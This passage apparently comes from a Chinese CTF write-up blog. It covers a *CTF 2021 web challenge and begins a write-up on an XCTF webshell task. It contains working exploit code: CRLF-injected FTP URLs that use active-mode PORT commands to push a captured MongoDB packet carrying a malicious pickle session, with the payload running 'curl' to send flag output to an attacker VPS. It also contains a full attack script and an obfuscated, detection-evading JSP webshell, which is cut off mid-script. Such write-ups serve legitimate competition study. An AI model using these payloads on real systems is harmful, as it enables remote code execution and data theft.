self.SESSION_USE_SIGNER = data[<span class="string">&#x27;SESSION_USE_SIGNER&#x27;</span>]</span><br><span class="line">        self.SESSION_KEY_PREFIX = data[<span class="string">&#x27;SESSION_KEY_PREFIX&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        self.SQLALCHEMY_DATABASE_URI = data[<span class="string">&#x27;SQLALCHEMY_DATABASE_URI&#x27;</span>]</span><br><span class="line">        self.SQLALCHEMY_TRACK_MODIFICATIONS = data[<span class="string">&#x27;SQLALCHEMY_TRACK_MODIFICATIONS&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        self.REDIS_URL = data[<span class="string">&#x27;REDIS_URL&#x27;</span>]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¼€äº†ä¸ª ftpï¼Œè¯»å–  config.jsonï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp:&#x2F;&#x2F;fan:root@172.20.0.2:8877&#x2F;files&#x2F;config.json</span><br></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;secret_key&quot;</span>:<span class="string">&quot;f4545478ee86$%^&amp;&amp;%$#&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;DEBUG&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">&quot;SESSION_TYPE&quot;</span>: <span class="string">&quot;mongodb&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;REMOTE_MONGO_IP&quot;</span>: <span class="string">&quot;172.20.0.5&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;REMOTE_MONGO_PORT&quot;</span>: <span class="number">27017</span>,</span><br><span class="line">  <span class="attr">&quot;SESSION_MONGODB_DB&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;SESSION_MONGODB_COLLECT&quot;</span>: <span class="string">&quot;sessions&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;SESSION_PERMANENT&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">&quot;SESSION_USE_SIGNER&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">&quot;SESSION_KEY_PREFIX&quot;</span>: <span class="string">&quot;session:&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;SQLALCHEMY_DATABASE_URI&quot;</span>: <span class="string">&quot;mysql+pymysql://root:starctf123456@172.20.0.3:3306/ctf?charset=utf8&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;SQLALCHEMY_TRACK_MODIFICATIONS&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">&quot;REDIS_URL&quot;</span>: <span class="string">&quot;redis://@172.20.0.4:6379/0&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ª urllib.request.urlopenï¼Œæµ‹è¯•å‘ç°å­˜åœ¨ CRLF æ³¨å…¥ã€‚</p><p>åˆ†æä¸€ä¸‹ï¼Œé¢˜ç›®è¿åŒ webserverï¼Œä¸€å…±å¯åŠ¨äº† webserverã€ftpã€mongodbã€mysql ä¸ redis 5 ä¸ªå®¹å™¨ã€‚é¢˜ç›®æç¤ºéœ€è¦ webserver çš„ rceï¼Œä»¥åŠä¸ redis æ— å…³ã€‚</p><p>åœ¨ config.json ä¸­å¯ä»¥çœ‹åˆ° session æ˜¯ä½¿ç”¨ mongodb å­˜å‚¨çš„ï¼Œä»¥å‰æ€»æ˜¯è€ƒä½¿ç”¨ redis å­˜å‚¨ï¼Œssrf æ”»å‡» redis æ³¨å…¥æ¶æ„åºåˆ—åŒ–æ•°æ® getshellã€‚è¿™ä¸ªé¢˜è™½ç„¶æ˜¯ä½¿ç”¨ mongodb å­˜å‚¨ sessionï¼Œä½†å› ä¸º flask-session æŠŠ session æ•°æ®åºåˆ—åŒ–ï¼Œæ‰€ä»¥æ— è®ºä½¿ç”¨ä»€ä¹ˆå­˜å‚¨ sessionï¼Œç†è®ºä¸Šéƒ½æœ‰ ssrf + ååºåˆ—åŒ–çš„å¯èƒ½ã€‚</p><p>ç°åœ¨æˆ‘ä»¬çš„ç›®æ ‡æ˜¯å°†æ¶æ„çš„åºåˆ—åŒ–æ•°æ®æ³¨å…¥åˆ°mongodbé‡Œï¼Œè¿™å°±éœ€è¦å€ŸåŠ© ftp äº†ã€‚ä¸ºä»€ä¹ˆä¸èƒ½ä½¿ç”¨<code>http://ip:port\r\npayload\r\n</code>è¿™ç§å‘¢ï¼Œå› ä¸º mongodb æ˜¯äºŒè¿›åˆ¶åè®®ï¼Œè¿™æ ·åšå‰é¢ä¼šæœ‰å¤šä½™çš„éƒ¨åˆ†ï¼ˆhttp åŒ…ï¼Œå‰é¢çš„GETä¸è·¯å¾„éƒ¨åˆ†ç­‰ï¼‰ï¼Œä¼šå½±å“ mongodbã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬éœ€è¦å€ŸåŠ© ftpï¼Œftp ä¸»åŠ¨æ¨¡å¼ä¸è¢«åŠ¨æ¨¡å¼ï¼Œä»¥åŠ CRLF å¯ä»¥å‚è€ƒ@Zeddy çš„æ–‡ç« ï¼š<a href="http://blog.zeddyu.info/2020/04/20/Plaid-CTF-2020-Web-1/">http://blog.zeddyu.info/2020/04/20/Plaid-CTF-2020-Web-1/</a></p><p>æ¯”èµ›çš„æ—¶å€™ï¼Œä¸€ç›´å‘ç€è¢«åŠ¨æ¨¡å¼ï¼Œå°è¯•è®© webserver ä¸‹è½½æ–‡ä»¶ï¼Œæ€è·¯èµ°åäº†ã€‚è¿™ä¸ªé¢˜å…¶å®æ˜¯åˆ©ç”¨ä¸»åŠ¨æ¨¡å¼ä¸‹è½½æ–‡ä»¶ä¸ä¸Šä¼ æ–‡ä»¶ã€‚</p><p>å…ˆæ”¾ä¸€å¼ ä¸»åŠ¨æ¨¡å¼çš„ç¤ºæ„å›¾ï¼š</p><p><img src="/2021/01/19/2021-starctf/v2-0db8a30b0848c731fdb70f3270f5fba3_1440w.jpg" alt="img"></p><p>æ—¢ç„¶æˆ‘ä»¬åˆ©ç”¨ http æ— æ³•æ”»å‡» mongodbï¼Œé‚£ä¹ˆå°±éœ€è¦ ftp æœåŠ¡å™¨å¸®æˆ‘ä»¬æŠŠæ•°æ®æ‰“è¿‡å»ã€‚å¯ä»¥æƒ³åˆ°æˆ‘ä»¬å¯ä»¥åœ¨ä¸»åŠ¨æ¨¡å¼çš„æ­¥éª¤ 2ï¼Œç”¨ PORT å‘½ä»¤æŠŠå®¢æˆ·ç«¯æŒ‡å®šæˆ mongodb æœåŠ¡çš„ ip å’Œç«¯å£ï¼Œå†é€‰æ‹©ä¸‹è½½æ–‡ä»¶ï¼Œè¿™æ ·å°±å¯ä»¥æŠŠæ–‡ä»¶çš„å†…å®¹æ‰“åˆ° mongodb æœåŠ¡ã€‚</p><p>é‚£ä¹ˆè¿™ä¸ªæ”»å‡»å‰ææ˜¯æˆ‘ä»¬éœ€è¦å°†æ•°æ®åŒ…å†™åˆ° ftp server çš„ä¸€ä¸ªæ–‡ä»¶é‡Œï¼Œè¿™ä¹Ÿå¯ä»¥åˆ©ç”¨ä¸»åŠ¨æ¨¡å¼å®ç°ã€‚æˆ‘ä»¬åŒæ ·åœ¨æ­¥éª¤ 2ï¼Œç”¨ PORT å‘½ä»¤æŠŠå®¢æˆ·ç«¯æŒ‡å®šæˆæˆ‘ä»¬ vps çš„ ip å’Œç«¯å£ï¼Œå†é€‰æ‹©ä¸Šä¼ æ–‡ä»¶ï¼Œé‚£ä¹ˆ ftp server å°±å¯ä»¥ä»æˆ‘ä»¬çš„vpsè¿™é‡Œä¸‹è½½æ–‡ä»¶ã€‚</p><p>æ‰€ä»¥æ€è·¯æ˜ç¡®äº†ï¼Œæ­¥éª¤å¦‚ä¸‹ï¼š</p><ol><li>å°†æ•°æ®åŒ…æ”¾åˆ°vpsä¸Šï¼Œåˆ©ç”¨ ftp å°†æ•°æ®åŒ…ä¸Šä¼ åˆ° ftp serverï¼›</li><li>åˆ©ç”¨ ftp æŠŠ ftp server çš„æ•°æ®åŒ…å‘é€åˆ° mongodb ï¼ˆæŠŠæµé‡æ‰“è¿‡å»ï¼‰</li><li>åˆ·æ–°ç›¸åº” session é¡µé¢ï¼Œè§¦å‘ååºåˆ—åŒ–</li></ol><p>ç°åœ¨å‰©ä¸‹çš„ä¸€ä¸ªé—®é¢˜å°±æ˜¯ mongodb çš„æ•°æ®åŒ…æˆ‘ä»¬æ²¡æœ‰ï¼Œè¿™é‡Œé‡‡å–æœ¬åœ°æŠ“åŒ…çš„æ–¹å¼ã€‚ä¹Ÿå¯ä»¥å‚è€ƒ L æˆ˜é˜Ÿå¸ˆå‚…çš„æ–¹æ³•ï¼š<a href="https://blog.frankli.site/2021/01/18/*CTF-2021-Web/">https://blog.frankli.site/2021/01/18/*CTF-2021-Web/</a></p><p>é¦–å…ˆå¯ä¸€ä¸ª mongodb çš„dockerï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -itd --name mongo -p 27017:27017 mongo</span><br></pre></td></tr></table></figure><p>æŒ‰ç…§é¢˜ç›®ï¼Œè¿›å…¥å®¹å™¨ï¼Œåˆ›å»ºåä¸º admin çš„æ•°æ®åº“ä¸åä¸º sessions çš„ collectionã€‚</p><p>è¿™é‡Œä¸ºäº†æŠ“æµé‡ï¼Œä½¿ç”¨ socat è½¬å‘æµé‡ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat -v -x tcp-listen:4444,fork tcp-connect:localhost:27017</span><br></pre></td></tr></table></figure><p>æ‹¿ python æ’å…¥æ•°æ®ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> cPickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> pymongo <span class="keyword">import</span> MongoClient</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_payload</span>():</span></span><br><span class="line">    cmd = <span class="string">&#x27;curl -d &quot;`/readflag`&quot; vps:2333&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">exp</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">            <span class="keyword">return</span> (os.system, (cmd,))</span><br><span class="line"></span><br><span class="line">    data = cPickle.dumps(exp())</span><br><span class="line"></span><br><span class="line">    client = MongoClient(<span class="string">&#x27;localhost&#x27;</span>, <span class="number">4444</span>)</span><br><span class="line">    tmp = client.admin.sessions</span><br><span class="line">    tmp.update_one(</span><br><span class="line">        &#123;<span class="string">&#x27;id&#x27;</span>: <span class="string">&#x27;session:1b3c3cb9-d81c-419d-8e2d-3a8130ebde62&#x27;</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;$set&quot;</span>: &#123;<span class="string">&quot;val&quot;</span>: data&#125;&#125;,</span><br><span class="line">        upsert=<span class="literal">True</span></span><br><span class="line">    )</span><br><span class="line">get_payload()</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ° socat è®°å½•ä¸‹äº†æµé‡ï¼š</p><img src="/2021/01/19/2021-starctf/image-20210119144403189.png" alt="image-20210119144403189" style="zoom:50%;"><p>è¿™éƒ¨åˆ†æ˜¯æ’å…¥æ•°æ®çš„æµé‡ï¼Œæˆ‘ä»¬éœ€è¦åå…­è¿›åˆ¶ä¿å­˜ä¸‹æ¥ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat -x tcp-listen:4444,fork tcp-connect:localhost:27017</span><br></pre></td></tr></table></figure><p>æŠŠæ•°æ®åŒ…ä¿å­˜ï¼Œæ”¾åˆ° vpsä¸Šï¼Œèµ·ä¸ªç›‘å¬çš„æœåŠ¡ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> ctime</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;0.0.0.0&#x27;</span></span><br><span class="line">PORT = <span class="number">2202</span></span><br><span class="line">BUFSIZ = <span class="number">1024</span></span><br><span class="line">ADDR = (HOST, PORT)</span><br><span class="line"></span><br><span class="line">tcpSerSock = socket(AF_INET, SOCK_STREAM)</span><br><span class="line">tcpSerSock.bind(ADDR)</span><br><span class="line">tcpSerSock.listen(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">cnt = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    print(<span class="string">&#x27;waiting for connection...&#x27;</span>)</span><br><span class="line">    tcpCliSock, addr = tcpSerSock.accept()</span><br><span class="line">    cnt += <span class="number">1</span></span><br><span class="line">    print(<span class="string">&#x27;...connnecting from:&#x27;</span>, addr)</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>):</span><br><span class="line">        content = <span class="built_in">open</span>(<span class="string">&#x27;gml.txt&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">        print(content)</span><br><span class="line">        tcpCliSock.send(content)</span><br><span class="line">tcpSerSock.close()</span><br></pre></td></tr></table></figure><p>ç°åœ¨è®© ftp server ä¸‹è½½æˆ‘ä»¬çš„æ–‡ä»¶ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp:&#x2F;&#x2F;fan:root\r\nCWD .\r\nTYPE I\r\nPORT x,x,x,x,6,666\r\nSTOR gml.txt\r\n@172.20.0.2:8877&#x2F;&quot;</span><br></pre></td></tr></table></figure><p>æ³¨æ„ PORT å‘½ä»¤æ ¼å¼ï¼Œå‰å››ä¸ªæ•°å­—æ˜¯åè¿›åˆ¶çš„ipï¼Œåä¸¤ä¸ªæ˜¯ <code>6*256+666=2202</code>ï¼Œè¿™ä¹ˆè®¡ç®—çš„ç«¯å£å·ã€‚</p><p>å†æ¬¡è®¿é—® ftpï¼Œå‘ç°æœ‰äº†æ–‡ä»¶ï¼š</p><p><img src="/2021/01/19/2021-starctf/image-20210119142025328.png" alt="image-20210119142025328"></p><p>ä¸‹é¢è®© ftp server å»å‘ mongoldb å‘æµé‡ï¼ˆç«¯å£å·<code>105*256+137=27017</code>ï¼‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp:&#x2F;&#x2F;fan:root\r\nCWD .\r\nTYPE I\r\nPORT 172,20,0,5,105,137\r\nRETR gml.txt\r\n@172.20.0.2:8877&#x2F;</span><br></pre></td></tr></table></figure><p>ç„¶ååˆ·æ–°ä¸€ä¸‹é¡µé¢ï¼š</p><img src="/2021/01/19/2021-starctf/image-20210119142245882.png" alt="image-20210119142245882" style="zoom:50%;"><p>å®Œæ•´çš„è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> cPickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> pymongo <span class="keyword">import</span> MongoClient</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_payload</span>():</span></span><br><span class="line">    cmd = <span class="string">&#x27;curl -d &quot;`/readflag`&quot; x,x,x,x:2333&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">exp</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">            <span class="keyword">return</span> (os.system, (cmd,))</span><br><span class="line"></span><br><span class="line">    data = cPickle.dumps(exp())</span><br><span class="line"></span><br><span class="line">    client = MongoClient(<span class="string">&#x27;localhost&#x27;</span>, <span class="number">4444</span>)</span><br><span class="line">    tmp = client.admin.sessions</span><br><span class="line">    tmp.update_one(</span><br><span class="line">        &#123;<span class="string">&#x27;id&#x27;</span>: <span class="string">&#x27;session:1b3c3cb9-d81c-419d-8e2d-3a8130ebde62&#x27;</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;$set&quot;</span>: &#123;<span class="string">&quot;val&quot;</span>: data&#125;&#125;,</span><br><span class="line">        upsert=<span class="literal">True</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">attack</span>(<span class="params">filename</span>):</span></span><br><span class="line">    url = <span class="string">&quot;http://52.163.52.206:8088/&quot;</span></span><br><span class="line">    session = requests.Session()</span><br><span class="line">    username = <span class="string">&quot;&quot;</span>.join([random.choice(string.ascii_letters + string.digits) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)])</span><br><span class="line">    password = <span class="string">&quot;&quot;</span>.join([random.choice(string.ascii_letters + string.digits) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)])</span><br><span class="line"></span><br><span class="line">    paramsPost = &#123;<span class="string">&quot;password&quot;</span>: password, <span class="string">&quot;avatar&quot;</span>: filename, <span class="string">&quot;submit&quot;</span>: <span class="string">&quot;Go!&quot;</span>, <span class="string">&quot;username&quot;</span>: username&#125;</span><br><span class="line">    headers = &#123;<span class="string">&quot;Origin&quot;</span>: url, <span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;max-age=0&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">               <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Referer&quot;</span>: url + <span class="string">&quot;login&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>&#125;</span><br><span class="line">    response = session.post(url + <span class="string">&quot;login&quot;</span>, data=paramsPost, headers=headers, proxies=&#123;<span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line">    content = session.get(url + <span class="string">&#x27;shake_and_dice&#x27;</span>).content</span><br><span class="line"></span><br><span class="line">    res = content[content.find(<span class="string">&#x27;&lt;img src=&quot;&#x27;</span>) + <span class="built_in">len</span>(<span class="string">&#x27;&lt;img src=&quot;&#x27;</span>):content.find(<span class="string">&#x27;&quot; class=&quot;img-thumbnail&quot;&#x27;</span>)]</span><br><span class="line">    res = res[res.find(<span class="string">&#x27;data:image/png;base64,&#x27;</span>) + <span class="built_in">len</span>(<span class="string">&#x27;data:image/png;base64,&#x27;</span>):]</span><br><span class="line">    <span class="comment"># print res</span></span><br><span class="line">    file = b64decode(res)</span><br><span class="line">    name = filename.split(<span class="string">&#x27;/&#x27;</span>)[<span class="number">-1</span>]</span><br><span class="line">    <span class="built_in">print</span> file</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># get_payload()</span></span><br><span class="line">    <span class="comment"># attack(&quot;ftp://fan:root@172.20.0.2:8877/&quot;)</span></span><br><span class="line">    <span class="comment"># attack(&quot;ftp://fan:root\r\nCWD .\r\nTYPE I\r\nPORT x,x,x,x,6,666\r\nSTOR gml.txt\r\n@172.20.0.2:8877/&quot;)</span></span><br><span class="line">    attack(<span class="string">&quot;ftp://fan:root\r\nCWD .\r\nTYPE I\r\nPORT 172,20,0,5,105,137\r\n\r\nRETR gml.txt\r\n@172.20.0.2:8877/&quot;</span>)</span><br></pre></td></tr></table></figure><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>è¿™æ¬¡é™¤äº† bet æ„Ÿè§‰å‰©ä¸‹ä¸æ˜¯é‚£ä¹ˆä¼ ç»Ÿçš„ Webï¼Œè‡ªå·±å› ä¸ºä¹‹å‰ ftp æ²¡è°ƒè¿‡ä¹Ÿæ²¡å¤ç°è¿‡ï¼ˆä¹‹å‰åº”è¯¥æœ‰å‡ æ¬¡æ¯”èµ›è€ƒå¯Ÿäº† ftp ï¼Œåƒäº†æ‡’æƒ°çš„äºâ€¦</p><p>æœ€åç¦» 0ops å°±å·®ä¸€é“é¢˜æœ‰ç‚¹å¯æƒœï¼Œä¸è¿‡ 0ops ä¹‹å‰æœ‰é—¨ç¥¨ï¼Œåº”è¯¥ä¹Ÿè¿›äº† XCTF Finalã€‚anywayï¼Œè¿™æ¬¡ç®—æ˜¯æˆ˜é˜Ÿå…¨åŠ›æ‰“äº†ï¼Œé˜Ÿå‹éƒ½ tqlã€‚</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020 XCTF åä¸ºäº‘ä¸“åœºéƒ¨åˆ†wp</title>
      <link href="/2020/12/21/2020-XCTF-huawei-cloud/"/>
      <url>/2020/12/21/2020-XCTF-huawei-cloud/</url>
      
        <content type="html"><![CDATA[<p>ä¸´è¿‘æœŸæœ«ï¼ŒæŠ½äº†åŠå¤©æ—¶é—´åšäº†å››é“æ°´é¢˜â€¦</p><a id="more"></a><h2 id="webshell-1"><a href="#webshell-1" class="headerlink" title="webshell_1"></a>webshell_1</h2><p>å…æ€çš„jspï¼Œç½‘ä¸Šæ‰¾ä¸ªæ”¹ä¸€æ”¹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line">shell = <span class="string">&#x27;&#x27;&#x27;&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot;  language=&quot;java&quot; %&gt;</span></span><br><span class="line"><span class="string">&lt;%</span></span><br><span class="line"><span class="string">        Class rt = Class.forName(new String(new byte[] &#123; 106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101 &#125;));</span></span><br><span class="line"><span class="string">        Process e = (Process) rt.getMethod(new String(new byte[] &#123; 101, 120, 101, 99 &#125;), String.class).invoke(rt.getMethod(new String(new byte[] &#123; 103, 101, 116, 82, 117, 110, 116, 105, 109, 101 &#125;)).invoke(null), &quot;cat /flag&quot; );</span></span><br><span class="line"><span class="string">        \u006a\u0061\u0076\u0061\u002e\u0069\u006f\u002e\u0049\u006e\u0070\u0075\u0074\u0053\u0074\u0072\u0065\u0061\u006d\u0020\u0069\u006e\u0020\u003d\u0020\u0065\u002e\u0067\u0065\u0074\u0049\u006e\u0070\u0075\u0074\u0053\u0074\u0072\u0065\u0061\u006d\u0028\u0029\u003b</span></span><br><span class="line"><span class="string">        int a = -1;byte[] b = new byte[2048];out.print(&quot;&lt;pre&gt;&quot;);</span></span><br><span class="line"><span class="string">        while((a=in.read(b))!=-1)&#123; out.println(new String(b)); &#125;out.print(&quot;&lt;/pre&gt;&quot;);</span></span><br><span class="line"><span class="string">%&gt;&#x27;&#x27;&#x27;</span></span><br><span class="line">l = <span class="built_in">len</span>(shell)</span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;=&quot;</span> <span class="keyword">in</span> b64encode(shell):</span><br><span class="line">        shell += <span class="string">&#x27; &#x27;</span></span><br><span class="line">        shell += <span class="string">&#x27; &#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">paramsPost = b64encode(shell)</span><br><span class="line">headers = &#123;<span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://121.37.182.111:32201&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;application/json, text/plain, */*&quot;</span>,</span><br><span class="line">           <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36&quot;</span>,</span><br><span class="line">           <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://121.37.182.111:32201/&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>, <span 